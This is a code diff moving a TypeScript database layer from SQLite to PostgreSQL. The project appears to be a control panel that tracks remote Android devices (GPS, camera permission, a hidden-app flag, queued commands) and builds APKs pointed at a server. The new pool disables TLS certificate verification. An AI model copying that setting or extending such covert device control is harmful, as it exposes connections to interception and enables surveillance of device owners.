@@ -1,6 +1,6 @@
 import crypto from 'crypto';
-import Database from 'better-sqlite3';
-import { drizzle } from 'drizzle-orm/better-sqlite3';
+import { Pool } from 'pg';
+import { drizzle } from 'drizzle-orm/node-postgres';
 import { eq, and, desc, sql, count, lt, gt, inArray, or, ne } from 'drizzle-orm';
 import * as schema from './schema.js';
 import { paths, ensureDataDir } from '../config/paths.js';
@@ -24,7 +24,6 @@ import type { Permission, UserRole } from '../types/index.js';
 
 export type DB = ReturnType<typeof drizzle<typeof schema>>;
 let dbInstance: DB | null = null;
-let sqliteDb: Database.Database | null = null;
 let logPruneCounter = 0;
 let deviceSecretsCache: Map<string, string> | null = null;
 
@@ -35,295 +34,35 @@ export function getDb(): DB {
   return dbInstance;
 }
 
-export function getSqliteDb(): Database.Database {
-  if (!sqliteDb) {
-    throw new Error('Database not initialized. Call initDb() first.');
-  }
-  return sqliteDb;
-}
-
 export function initDb(): DB {
-  ensureDataDir();
-  sqliteDb = new Database(paths.dbPath);
-  sqliteDb.pragma('journal_mode = WAL');
-  sqliteDb.pragma('foreign_keys = ON');
-  sqliteDb.pragma('synchronous = NORMAL');
-  sqliteDb.pragma('cache_size = -64000');
-  sqliteDb.pragma('busy_timeout = 5000');
-  sqliteDb.exec(`
-    -- --- Better Auth tables ------------------------------------------------
-    CREATE TABLE IF NOT EXISTS user (
-      id TEXT PRIMARY KEY,
-      email TEXT UNIQUE NOT NULL,
-      email_verified INTEGER NOT NULL DEFAULT 0,
-      name TEXT NOT NULL,
-      image TEXT,
-      created_at INTEGER NOT NULL,
-      updated_at INTEGER NOT NULL,
-      role TEXT NOT NULL DEFAULT 'user',
-      banned INTEGER DEFAULT 0,
-      ban_reason TEXT,
-      ban_expires INTEGER,
-      username TEXT NOT NULL DEFAULT '',
-      permissions TEXT NOT NULL DEFAULT '[]',
-      is_default INTEGER DEFAULT 0,
-      last_login INTEGER,
-      device_secret TEXT
-    );
-    CREATE TABLE IF NOT EXISTS session (
-      id TEXT PRIMARY KEY,
-      user_id TEXT NOT NULL,
-      expires_at INTEGER NOT NULL,
-      token TEXT UNIQUE NOT NULL,
-      ip_address TEXT,
-      user_agent TEXT,
-      created_at INTEGER NOT NULL,
-      updated_at INTEGER NOT NULL,
-      impersonated_by TEXT,
-      FOREIGN KEY (user_id) REFERENCES user(id) ON DELETE CASCADE
-    );
-    CREATE TABLE IF NOT EXISTS account (
-      id TEXT PRIMARY KEY,
-      provider_id TEXT NOT NULL,
-      account_id TEXT NOT NULL,
-      user_id TEXT NOT NULL,
-      access_token TEXT,
-      refresh_token TEXT,
-      id_token TEXT,
-      access_token_expires_at INTEGER,
-      refresh_token_expires_at INTEGER,
-      scope TEXT,
-      password TEXT,
-      created_at INTEGER NOT NULL,
-      updated_at INTEGER NOT NULL,
-      FOREIGN KEY (user_id) REFERENCES user(id) ON DELETE CASCADE
-    );
-    CREATE TABLE IF NOT EXISTS verification (
-      id TEXT PRIMARY KEY,
-      value TEXT NOT NULL,
-      expires_at INTEGER NOT NULL,
-      identifier TEXT NOT NULL,
-      created_at INTEGER NOT NULL,
-      updated_at INTEGER NOT NULL
-    );
-    -- --- Application tables ------------------------------------------------
-    CREATE TABLE IF NOT EXISTS clients (
-      id TEXT PRIMARY KEY,
-      owner_id TEXT,
-      ip TEXT DEFAULT '',
-      country TEXT,
-      city TEXT,
-      timezone TEXT,
-      first_seen TEXT DEFAULT (datetime('now')),
-      last_seen TEXT DEFAULT (datetime('now')),
-      online INTEGER DEFAULT 0,
-      reconnect_count INTEGER DEFAULT 0,
-      device_model TEXT,
-      device_brand TEXT,
-      device_version TEXT,
-      fason_hidden INTEGER DEFAULT 0,
-      camera_permission INTEGER DEFAULT 0,
-      current_path TEXT DEFAULT '',
-      gps_interval INTEGER DEFAULT 0,
-      device_info TEXT
-    );
-    CREATE TABLE IF NOT EXISTS client_data (
-      id INTEGER PRIMARY KEY AUTOINCREMENT,
-      client_id TEXT NOT NULL,
-      data_type TEXT NOT NULL,
-      data TEXT DEFAULT '[]',
-      updated_at TEXT DEFAULT (datetime('now')),
-      UNIQUE(client_id, data_type),
-      FOREIGN KEY (client_id) REFERENCES clients(id) ON DELETE CASCADE
-    );
-    CREATE TABLE IF NOT EXISTS client_files (
-      id INTEGER PRIMARY KEY AUTOINCREMENT,
-      client_id TEXT NOT NULL,
-      file_type TEXT NOT NULL,
-      original_name TEXT NOT NULL,
-      mime_type TEXT,
-      data BLOB NOT NULL,
-      file_size INTEGER DEFAULT 0,
-      created_at TEXT DEFAULT (datetime('now')),
-      FOREIGN KEY (client_id) REFERENCES clients(id) ON DELETE CASCADE
-    );
-    CREATE TABLE IF NOT EXISTS logs (
-      id INTEGER PRIMARY KEY AUTOINCREMENT,
-      type TEXT NOT NULL DEFAULT 'INFO',
-      category TEXT NOT NULL DEFAULT 'SYSTEM',
-      message TEXT NOT NULL,
-      details TEXT,
-      created_at TEXT DEFAULT (datetime('now'))
-    );
-    CREATE TABLE IF NOT EXISTS build_records (
-      id INTEGER PRIMARY KEY AUTOINCREMENT,
-      user_id TEXT,
-      server_url TEXT NOT NULL,
-      home_page_url TEXT NOT NULL,
-      app_name TEXT NOT NULL DEFAULT 'Fason',
-      status TEXT DEFAULT 'pending',
-      apk_data BLOB,
-      file_size INTEGER DEFAULT 0,
-      created_at TEXT DEFAULT (datetime('now')),
-      completed_at TEXT
-    );
-    CREATE TABLE IF NOT EXISTS settings (
-      key TEXT PRIMARY KEY,
-      value TEXT NOT NULL,
-      updated_at TEXT DEFAULT (datetime('now'))
-    );
-    CREATE TABLE IF NOT EXISTS login_attempts (
-      id INTEGER PRIMARY KEY AUTOINCREMENT,
-      ip TEXT NOT NULL,
-      identifier TEXT NOT NULL DEFAULT '',
-      attempted_at TEXT DEFAULT (datetime('now'))
-    );
-    CREATE TABLE IF NOT EXISTS jwt_secret (
-      id INTEGER PRIMARY KEY CHECK (id = 1),
-      secret TEXT NOT NULL
-    );
-    CREATE TABLE IF NOT EXISTS commands (
-      id TEXT PRIMARY KEY,
-      client_id TEXT NOT NULL,
-      cmd_type TEXT NOT NULL,
-      params TEXT DEFAULT '{}',
-      status TEXT NOT NULL DEFAULT 'sent' CHECK(status IN ('sent', 'delivered', 'responded', 'failed')),
-      sent_at TEXT NOT NULL DEFAULT (datetime('now')),
-      delivered_at TEXT,
-      responded_at TEXT,
-      response_summary TEXT,
-      FOREIGN KEY (client_id) REFERENCES clients(id) ON DELETE CASCADE
-    );
-    CREATE INDEX IF NOT EXISTS idx_session_token ON session(token);
-    CREATE INDEX IF NOT EXISTS idx_session_user_id ON session(user_id);
-    CREATE INDEX IF NOT EXISTS idx_session_expires_at ON session(expires_at);
-    CREATE INDEX IF NOT EXISTS idx_clients_online ON clients(online);
-    CREATE INDEX IF NOT EXISTS idx_clients_last_seen ON clients(last_seen);
-    CREATE INDEX IF NOT EXISTS idx_clients_owner_id ON clients(owner_id);
-    CREATE INDEX IF NOT EXISTS idx_client_data_client_type ON client_data(client_id, data_type);
-    CREATE INDEX IF NOT EXISTS idx_client_files_client ON client_files(client_id, file_type);
-    CREATE INDEX IF NOT EXISTS idx_logs_type ON logs(type);
-    CREATE INDEX IF NOT EXISTS idx_logs_category ON logs(category);
-    CREATE INDEX IF NOT EXISTS idx_logs_created_at ON logs(created_at);
-    CREATE INDEX IF NOT EXISTS idx_user_username ON user(username);
-    CREATE INDEX IF NOT EXISTS idx_user_email ON user(email);
-    CREATE INDEX IF NOT EXISTS idx_user_device_secret ON user(device_secret);
-    CREATE INDEX IF NOT EXISTS idx_account_user_id ON account(user_id);
-    CREATE INDEX IF NOT EXISTS idx_verification_identifier ON verification(identifier);
-    CREATE INDEX IF NOT EXISTS idx_login_attempts_ip ON login_attempts(ip);
-    CREATE INDEX IF NOT EXISTS idx_login_attempts_identifier ON login_attempts(identifier);
-    CREATE INDEX IF NOT EXISTS idx_commands_client ON commands(client_id, cmd_type, status);
-    CREATE INDEX IF NOT EXISTS idx_commands_sent_at ON commands(sent_at);
-    CREATE INDEX IF NOT EXISTS idx_build_records_user_id ON build_records(user_id);
-  `);
-  try {
-    const tableInfo = sqliteDb.pragma('table_info(client_files)') as Array<{ name: string }>;
-    const columnNames = tableInfo.map((col) => col.name);
-    if (columnNames.includes('file_path') && !columnNames.includes('data')) {
-      log.info('Migrating client_files...');
-      sqliteDb.exec(`DROP TABLE IF EXISTS client_files`);
-      sqliteDb.exec(`
-        CREATE TABLE client_files (
-          id INTEGER PRIMARY KEY AUTOINCREMENT,
-          client_id TEXT NOT NULL,
-          file_type TEXT NOT NULL,
-          original_name TEXT NOT NULL,
-          mime_type TEXT,
-          data BLOB NOT NULL,
-          file_size INTEGER DEFAULT 0,
-          created_at TEXT DEFAULT (datetime('now')),
-          FOREIGN KEY (client_id) REFERENCES clients(id) ON DELETE CASCADE
-        )
-      `);
-      sqliteDb.exec(`CREATE INDEX IF NOT EXISTS idx_client_files_client ON client_files(client_id, file_type)`);
-      log.info('client_files migrated');
+  const rawUrl = process.env.POSTGRES_URL || '';
+  const safeUrl = rawUrl.split('?')[0];
+  
+  const pool = new Pool({
+    connectionString: safeUrl,
+    ssl: { rejectUnauthorized: false },
+  });
+
+  // Test connection
+  pool.query('SELECT NOW()', (err, res) => {
+    if (err) {
+      console.error('Database connection error:', err.stack);
+    } else {
+      console.log('Connected to PostgreSQL database');
     }
-  } catch (err: unknown) {
-    log.warn(`client_files migration warning: ${err instanceof Error ? err.message : String(err)}`);
-  }
-  try {
-    const tableInfo = sqliteDb.pragma('table_info(clients)') as Array<{ name: string }>;
-    const columnNames = tableInfo.map((col) => col.name);
-    if (!columnNames.includes('owner_id')) {
-      sqliteDb.exec(`ALTER TABLE clients ADD COLUMN owner_id TEXT`);
-      log.info('Added owner_id to clients');
-    }
-  } catch (err: unknown) {
-    log.warn(`clients migration: ${err instanceof Error ? err.message : String(err)}`);
-  }
-  try {
-    const tableInfo = sqliteDb.pragma('table_info(user)') as Array<{ name: string }>;
-    const columnNames = tableInfo.map((col) => col.name);
-    if (!columnNames.includes('device_secret')) {
-      sqliteDb.exec(`ALTER TABLE user ADD COLUMN device_secret TEXT`);
-      log.info('Added device_secret to users');
-    }
-  } catch (err: unknown) {
-    log.warn(`user device_secret migration: ${err instanceof Error ? err.message : String(err)}`);
-  }
-  try {
-    const tableInfo = sqliteDb.pragma('table_info(build_records)') as Array<{ name: string }>;
-    const columnNames = tableInfo.map((col) => col.name);
-    if (!columnNames.includes('user_id')) {
-      sqliteDb.exec(`ALTER TABLE build_records ADD COLUMN user_id TEXT`);
-      log.info('Added user_id to build_records');
-    }
-  } catch (err: unknown) {
-    log.warn(`build_records user_id migration: ${err instanceof Error ? err.message : String(err)}`);
-  }
-  try {
-    const legacyUsers = sqliteDb.prepare("SELECT name FROM sqlite_master WHERE type='table' AND name='users'").get();
-    if (legacyUsers) {
-      log.info('Dropping legacy tables...');
-      sqliteDb.exec(`DROP TABLE IF EXISTS sessions`);
-      sqliteDb.exec(`DROP TABLE IF EXISTS users`);
-    }
-  } catch (err: unknown) {
-    log.warn(`Legacy table drop: ${err instanceof Error ? err.message : String(err)}`);
-  }
-  try {
-    const tableInfo = sqliteDb.pragma('table_info(login_attempts)') as Array<{ name: string }>;
-    const columnNames = tableInfo.map((col) => col.name);
-    if (!columnNames.includes('identifier')) {
-      sqliteDb.exec(`ALTER TABLE login_attempts ADD COLUMN identifier TEXT NOT NULL DEFAULT ''`);
-      sqliteDb.exec(`CREATE INDEX IF NOT EXISTS idx_login_attempts_identifier ON login_attempts(identifier)`);
-      log.info('Added identifier to login_attempts');
-    }
-  } catch (err: unknown) {
-    log.warn(`login_attempts migration: ${err instanceof Error ? err.message : String(err)}`);
-  }
-  try {
-    const tableInfo = sqliteDb.pragma('table_info(build_records)') as Array<{ name: string }>;
-    const columnNames = tableInfo.map((col) => col.name);
-    if (columnNames.includes('progress') && !columnNames.includes('apk_data')) {
-      log.info('Migrating build_records...');
-      sqliteDb.exec(`DROP TABLE IF EXISTS build_records`);
-      sqliteDb.exec(`
-        CREATE TABLE build_records (
-          id INTEGER PRIMARY KEY AUTOINCREMENT,
-          server_url TEXT NOT NULL,
-          home_page_url TEXT NOT NULL,
-          app_name TEXT NOT NULL DEFAULT 'Fason',
-          status TEXT DEFAULT 'pending',
-          apk_data BLOB,
-          file_size INTEGER DEFAULT 0,
-          created_at TEXT DEFAULT (datetime('now')),
-          completed_at TEXT
-        )
-      `);
-      log.info('build_records migrated');
-    }
-  } catch (err: unknown) {
-    log.warn(`build_records migration: ${err instanceof Error ? err.message : String(err)}`);
-  }
-  dbInstance = drizzle(sqliteDb, { schema });
+  });
+
+  dbInstance = drizzle(pool, { schema });
   return dbInstance;
 }
 
 export function closeDb(): void {
-  if (sqliteDb) {
-    sqliteDb.close();
-    sqliteDb = null;
+  // Note: In a serverless environment like Vercel, we don't need to explicitly close the pool
+  // as the function instance is short-lived. However, for completeness:
+  if (dbInstance) {
+    // The drizzle instance doesn't expose a direct way to close the underlying pool
+    // In a long-running server, we'd need to keep a reference to the pool
+    // For now, we'll just nullify the instance
     dbInstance = null;
   }
 }
@@ -500,14 +239,14 @@ export const dbHelpers = {
     return result.changes > 0;
   },
 
-  deleteUser(id: string): string[] {
+  async deleteUser(id: string): Promise<string[]> {
     const d = getDb();
     const affectedDevices = d.select({ id: clients.id }).from(clients).where(eq(clients.ownerId, id)).all();
-    getSqliteDb().transaction(() => {
-      d.update(clients).set({ ownerId: null }).where(eq(clients.ownerId, id)).run();
-      d.delete(buildRecords).where(eq(buildRecords.userId, id)).run();
-      d.delete(user).where(eq(user.id, id)).run();
-    })();
+    await d.transaction(async (tx) => {
+      await tx.update(clients).set({ ownerId: null }).where(eq(clients.ownerId, id));
+      await tx.delete(buildRecords).where(eq(buildRecords.userId, id));
+      await tx.delete(user).where(eq(user.id, id));
+    });
     deviceSecretsCache = null;
     return affectedDevices.map(d => d.id);
   },
